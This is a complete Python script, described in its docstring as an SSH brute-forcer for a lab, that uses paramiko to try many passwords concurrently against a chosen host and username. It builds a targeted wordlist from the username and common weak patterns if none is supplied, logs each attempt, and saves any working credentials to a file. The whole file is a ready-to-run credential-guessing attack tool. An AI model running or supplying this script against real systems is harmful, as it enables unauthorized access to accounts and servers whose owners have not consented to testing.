"""Concurrent SSH bruteforcer for the lab environment."""
from __future__ import annotations

import argparse
import concurrent.futures
import logging
import random
import string
import sys
import time
from pathlib import Path
from typing import Iterable, List

import paramiko


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True, help="Target host or IP")
    parser.add_argument("--port", type=int, default=22, help="Target SSH port")
    parser.add_argument("--username", required=True, help="Username to test")
    parser.add_argument(
        "--wordlist",
        type=Path,
        required=True,
        help="Path to a password wordlist. Created if not present.",
    )
    parser.add_argument(
        "--max-workers",
        type=int,
        default=4,
        help="Number of concurrent attempts",
    )
    parser.add_argument("--timeout", type=float, default=5.0, help="Connection timeout in seconds")
    parser.add_argument("--log", type=Path, default=Path("bruteforce.log"), help="Output log path")
    return parser


def generate_candidates(wordlist: Path, username: str) -> List[str]:
    """Generate a minimal targeted wordlist if one does not exist."""
    if wordlist.exists():
        return [line.strip() for line in wordlist.read_text(encoding="utf-8").splitlines() if line.strip()]

    base_tokens = [username, "password", "admin", "welcome", "letmein"]
    suffixes = ["123", "!", "2024", "123!", "321"]
    candidates = {"WeakPass123!"}
    for token in base_tokens:
        candidates.add(token)
        for suffix in suffixes:
            candidates.add(f"{token}{suffix}")
            candidates.add(f"{token.capitalize()}{suffix}")
    for _ in range(5):
        candidates.add("".join(random.choices(string.ascii_letters + string.digits, k=10)))

    wordlist.write_text("\n".join(sorted(candidates)), encoding="utf-8")
    return sorted(candidates)


def attempt_login(host: str, port: int, username: str, password: str, timeout: float) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
        )
    except paramiko.AuthenticationException:
        return False
    except Exception as exc:  # noqa: BLE001
        logging.getLogger(__name__).debug("Connection error for %s: %s", password, exc)
        return False
    else:
        client.close()
        return True


def worker(host: str, port: int, username: str, password: str, timeout: float) -> tuple[str, bool]:
    success = attempt_login(host, port, username, password, timeout)
    return password, success


def run_bruteforce(args: argparse.Namespace) -> None:
    logging.basicConfig(
        filename=args.log,
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    logger = logging.getLogger(__name__)
    passwords = generate_candidates(args.wordlist, args.username)
    logger.info("Testing %d candidate passwords", len(passwords))

    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.max_workers) as executor:
        futures = [
            executor.submit(worker, args.host, args.port, args.username, password, args.timeout)
            for password in passwords
        ]
        for future in concurrent.futures.as_completed(futures):
            password, success = future.result()
            logger.info("Attempted password=%s success=%s", password, success)
            if success:
                print(f"[+] Valid credentials found: {args.username}:{password}")
                (args.log.parent / "success.txt").write_text(f"{args.username}:{password}\n", encoding="utf-8")
                return
    elapsed = time.time() - start
    logger.info("Completed bruteforce in %.2fs without success", elapsed)
    print("[-] No valid credentials found", file=sys.stderr)


def main(argv: Iterable[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(list(argv) if argv is not None else None)
    run_bruteforce(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
